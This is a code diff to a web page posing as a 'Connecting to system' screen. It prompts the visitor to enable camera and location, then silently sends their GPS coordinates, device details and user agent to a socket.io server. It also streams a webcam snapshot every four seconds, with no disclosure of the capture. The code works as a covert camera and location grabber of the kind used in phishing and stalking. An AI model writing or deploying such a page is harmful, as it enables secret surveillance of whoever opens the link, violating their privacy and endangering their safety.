@@ -2,24 +2,52 @@
 <html>
 <head>
   <title>Connecting...</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       background: #020617;
       color: #00ffcc;
       font-family: monospace;
       text-align: center;
-      margin-top: 100px;
+      padding: 20px;
     }
+    .box {
+      background: rgba(255,255,255,0.05);
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 0 20px rgba(0,255,204,0.4);
+    }
+    button {
+      margin-top: 10px;
+      padding: 10px 14px;
+      border: none;
+      border-radius: 8px;
+      background: #00ffcc;
+      color: #020617;
+      font-weight: bold;
+    }
+    video {
+      width: 260px;
+      border-radius: 12px;
+      margin-top: 12px;
+      border: 1px solid #00ffcc;
+    }
+    .note { font-size: 12px; opacity: 0.7; margin-top: 6px; }
   </style>
 </head>
 
 <body>
 
-<h2>📡 Connecting to system...</h2>
+<div class="box">
+  <h3>📡 Connecting to system…</h3>
+
+  <button id="enableAll">Enable Camera + Location</button>
+  <div class="note">Tap once to allow permissions</div>
+
+  <video id="video" autoplay playsinline muted></video>
+</div>
 
 <script src="/socket.io/socket.io.js"></script>
-
 <script>
   const socket = io(window.location.origin);
 
@@ -32,25 +60,58 @@
     return "Unknown Device";
   }
 
-  const deviceInfo = {
+  const baseInfo = {
     device: getDeviceName(),
-    screen: window.screen.width + "x" + window.screen.height
+    screen: window.screen.width + "x" + window.screen.height,
+    userAgent: navigator.userAgent
   };
 
-  // 📍 LOCATION
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        deviceInfo.lat = pos.coords.latitude;
-        deviceInfo.lng = pos.coords.longitude;
-        socket.emit("device-info", deviceInfo);
-      },
-      () => {
-        socket.emit("device-info", deviceInfo);
-      }
-    );
-  } else {
-    socket.emit("device-info", deviceInfo);
+  const video = document.getElementById("video");
+  const btn = document.getElementById("enableAll");
+
+  let stream = null;
+
+  btn.onclick = async () => {
+    // 1) Camera (user gesture required)
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+    } catch (e) {
+      alert("Camera permission denied");
+    }
+
+    // 2) Location (ask permission)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const info = {
+            ...baseInfo,
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude
+          };
+          socket.emit("device-info", info);
+        },
+        () => {
+          socket.emit("device-info", baseInfo);
+        }
+      );
+    } else {
+      socket.emit("device-info", baseInfo);
+    }
+
+    // 3) Start sending snapshots every 4s
+    setInterval(sendSnapshot, 4000);
+  };
+
+  function sendSnapshot() {
+    if (!video.srcObject) return;
+    const canvas = document.createElement("canvas");
+    canvas.width = 320;
+    canvas.height = 240;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const img = canvas.toDataURL("image/jpeg", 0.7);
+    socket.emit("camera-frame", img);
   }
 </script>
 
